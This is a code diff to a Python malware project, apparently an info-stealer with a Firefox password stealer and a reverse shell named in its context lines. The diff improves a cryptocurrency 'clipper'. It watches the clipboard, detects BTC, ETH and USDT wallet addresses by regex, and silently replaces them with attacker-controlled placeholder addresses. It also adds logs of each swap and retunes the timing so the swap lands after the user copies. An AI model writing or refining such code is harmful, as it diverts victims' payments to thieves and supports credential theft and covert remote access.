@@ -28,6 +28,8 @@ import cv2
 import threading
 import ctypes
 import sys
+import pyautogui
+pyautogui.FAILSAFE = False
 
 
 def single_instance_check():
@@ -274,42 +276,58 @@ def steal_firefox_passwords():
 
 # === CLIPPER ===
 CLIP_WALLETS = {
-    "BTC": "bc1xxx",
-    "ETH": "0x9e6b499df50c4d9fe9b1622b2c2a17e156c9963e",
-    "XRP": "rxyz",
-    "LTC": "ltc1xyz",
-    "BCH": "qxyxyxy",
-    "XMR": "4xxxxx"
+    "BTC": "<<BTC_ADDRESS>>",
+    "ETH": "<<ETH_ADDRESS>>",
+    "USDT_ERC20": "<<USDT_ERC20_ADDRESS>>",
+    "USDT_TRC20": "<<USDT_TRC20_ADDRESS>>"
 }
+
 CLIP_PATTERNS = {
     "BTC": r"(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}",
     "ETH": r"0x[a-fA-F0-9]{40}",
-    "XRP": r"r[0-9a-zA-Z]{24,34}",
-    "LTC": r"[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}",
-    "BCH": r"(bitcoincash:)?(q|p)[a-z0-9]{41}",
-    "XMR": r"4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}"
+    "USDT_ERC20": r"0x[a-fA-F0-9]{40}",  # Same as ETH
+    "USDT_TRC20": r"T[a-zA-HJ-NP-Z0-9]{33}"
 }
+
+
 
 def clipper():
     try:
         win32clipboard.OpenClipboard()
-        data = win32clipboard.GetClipboardData()
+        if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_UNICODETEXT):
+            data = win32clipboard.GetClipboardData()
+        else:
+            data = ""
         win32clipboard.CloseClipboard()
 
         for coin, pattern in CLIP_PATTERNS.items():
-            if re.fullmatch(pattern, data.strip()):
+            match = re.search(pattern, data.strip())  # ← FIXED: search instead of fullmatch
+            if match:
                 win32clipboard.OpenClipboard()
                 win32clipboard.EmptyClipboard()
                 win32clipboard.SetClipboardText(CLIP_WALLETS[coin])
                 win32clipboard.CloseClipboard()
+                with open(os.path.join(EXTRACT_FOLDER, "clipper_log.txt"), "a") as f:
+                    f.write(f"[{datetime.datetime.now()}] Replaced {coin} clipboard: {data.strip()} → {CLIP_WALLETS[coin]}\n")
                 break
-    except:
-        pass
+
+    except Exception as e:
+        try:
+            with open(os.path.join(EXTRACT_FOLDER, "clipper_error.txt"), "a") as err:
+                err.write(f"[{datetime.datetime.now()}] Clipper error: {str(e)}\n")
+        except:
+            pass
 
 def clipper_loop():
     while True:
+        time.sleep(0.3)  # Let user copy and move focus
         clipper()
-        time.sleep(1.5)
+        time.sleep(1.2)
+
+# def clipper_loop():
+#     while True:
+#         clipper()
+#         time.sleep(0.5)
     
 import datetime
 
@@ -592,8 +610,7 @@ RAM        : {round(psutil.virtual_memory().total / (1024**3), 2)} GB
         #     s.close()
 
 
-import pyautogui
-pyautogui.FAILSAFE = False
+
 
 # === EXECUTE CHAIN ===
 def keep_reverse_shell_alive():
